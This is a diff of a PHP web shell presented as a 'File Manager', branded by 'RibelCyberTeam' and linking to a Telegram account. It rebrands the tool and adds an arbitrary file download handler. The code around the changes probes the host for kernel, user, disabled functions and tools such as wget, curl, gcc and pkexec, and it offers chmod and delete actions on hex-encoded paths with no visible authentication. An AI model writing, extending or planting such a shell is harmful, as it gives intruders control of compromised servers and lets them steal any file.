@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-    <title>File Manager</title>
+    <title>Simple FileManager By RibelCyberTeam</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 </head>
 <style>
@@ -25,7 +25,7 @@
 <body class="bg-dark text-white">
     <div class="container mt-5">
         <a href="?" class="text-decoration-none text-white">
-            <h1 class="mb-4 text-center">File Manager</h1>
+            <h1 class="mb-4 text-center">Simple FileManager By RibelCyberTeam</h1>
         </a>
         <?php
         $green = "<span style='color: green;'>ON</span>";
@@ -63,8 +63,7 @@
             $gid = $gid['gid'];
         }        
         $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
-        echo "
-                <div>
+        echo "<div>
                     System: <gr>$kernel</gr><br>
                     User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
                     PHP Version: <gr>$phpver</gr> | PHP OS: <gr>$phpos</gr><br>
@@ -74,8 +73,7 @@
                     Safe Mode: $sm<br>
                     MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | Pkexec: $pxex | GCC: $gcc<br>
                     Disable Function: <br><pre>$disfc</pre>
-                </div>
-        ";
+                </div>";
         function hex($n) {
             $y = '';
             for ($i = 0; $i < strlen($n); $i++) {
@@ -228,6 +226,9 @@
                             <a href='?chmod=" . hex($itemPath) . "' class='btn btn-secondary btn-sm' title='Chmod'>
                                 <i class='fas fa-lock'></i>
                             </a>
+                            <a href='?download=" . hex($itemPath) . "' class='btn btn-success btn-sm' title='Download'>
+                                <i class='fas fa-download'></i>
+                            </a>
                             <a href='?delete=" . hex($itemPath) . "' class='btn btn-danger btn-sm' title='Hapus'>
                                 <i class='fas fa-trash'></i>
                             </a>
@@ -235,8 +236,7 @@
                     </td>
                   </tr>";
         }
-        echo "</tbody></table></div></div>";
-        echo '<p>Create By <a href="https://t.me/RibelCyberTeam" target="_blank">Ribel</a><img src="https://bot.backlinkku.id/verified.gif" width="17" height="17">.</p>';
+        echo "</tbody></table><p>Create By <a href=\"https://t.me/RibelCyberTeam\" target=\"_blank\">Ribel</a><img src=\"https://bot.backlinkku.id/verified.gif\" width=\"17\" height=\"17\" alt=\"Verified\"></p></div></div>";
         // Menghandle view file
         if (isset($_GET['view'])) {
             $file = unhex($_GET['view']);
@@ -315,6 +315,19 @@
                             <a href='?path=" . hex($path) . "' class='btn btn-secondary'>Batal</a>
                         </form>
                       </div>";
+            }
+        }
+        if (isset($_GET['download'])) {
+            $file = unhex($_GET['download']);
+            if (is_file($file)) {
+                header('Content-Description: File Transfer');
+                header('Content-Type: application/octet-stream');
+                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+                header('Content-Length: ' . filesize($file));
+                readfile($file);
+                exit;
+            } else {
+                echo "<script>alert('File tidak ditemukan.'); window.location='?path=" . hex(dirname($file)) . "';</script>";
             }
         }
         // Menghapus file
